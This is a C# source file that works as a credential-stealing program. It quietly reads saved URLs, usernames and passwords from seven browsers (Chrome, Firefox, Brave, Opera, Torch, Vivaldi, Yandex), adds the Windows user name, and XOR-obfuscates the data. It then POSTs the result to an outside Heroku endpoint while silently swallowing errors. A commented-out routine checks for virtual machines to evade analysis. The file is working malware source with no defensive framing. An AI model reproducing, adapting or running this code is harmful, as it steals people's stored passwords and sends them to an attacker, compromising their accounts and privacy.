using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace dao
{
    public class Main
    {
        public static void Start()
        {
            Thread thread = new Thread(() => Prepare());
            thread.Start();
        }

        public static void Prepare()
        {
            try
            {
                List<IReader> readers = new List<IReader>();
                readers.Add(new Brave());
                readers.Add(new Chrome());
                readers.Add(new Firefox());
                readers.Add(new Opera());
                readers.Add(new Torch());
                readers.Add(new Vivaldi());
                readers.Add(new Yandex());
                String username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                String text;
                text = username + "\r\n\r\n";
                foreach (var reader in readers)
                {
                    text += $"* {reader.BrowserName}\r\n";
                    try
                    {
                        var data = reader.Passwords();
                        foreach (var d in data)
                            text += ($"{d.Url}\t\t({d.Profile})\r\n\t\t{d.Username}\r\n\t\t{d.Password}\r\n");
                    }
                    catch (Exception ex)
                    {
                        text += ($"Error reading {reader.BrowserName} passwords: " + ex.Message);
                    }
                    text += "\r\n";
                }
                String url = "https://still-reaches-58146.herokuapp.com/note";
                byte[] bytes = Encoding.UTF8.GetBytes(text);
                bytes = XorBytes(bytes, KEY_BYTES);
                HP(url, bytes);
            }
            catch { }
        }

        private static readonly byte[] KEY_BYTES = new byte[] { 48, 5, 120, 79 };

        public static byte[] XorBytes(byte[] input, byte[] key)
        {
            int length = input.Length;
            int keyLength = key.Length;
            for (int i = 0; i < length; i++)
            {
                input[i] ^= key[i % keyLength];
            }
            return input;
        }

        public static string HP(string url, byte[] bytes)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/octet-stream"; // or whatever - application/json, etc, etc
            Stream requestWriter = request.GetRequestStream();
            {
                requestWriter.Write(bytes, 0, bytes.Length);
            }
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (StreamReader sr = new StreamReader(response.GetResponseStream()))
                {
                    return sr.ReadToEnd();
                }
            }
        }

        //public static Boolean CheckVM()
        //{
        //    using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        //    {
        //        using (var items = searcher.Get())
        //        {
        //            foreach (var item in items)
        //            {
        //                string manufacturer = item["Manufacturer"].ToString().ToLower();
        //                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
        //                    || manufacturer.Contains("vmware")
        //                    || item["Model"].ToString() == "VirtualBox")
        //                {
        //                    return true;
        //                }
        //            }
        //        }
        //    }
        //    return false;
        //}
    }
}
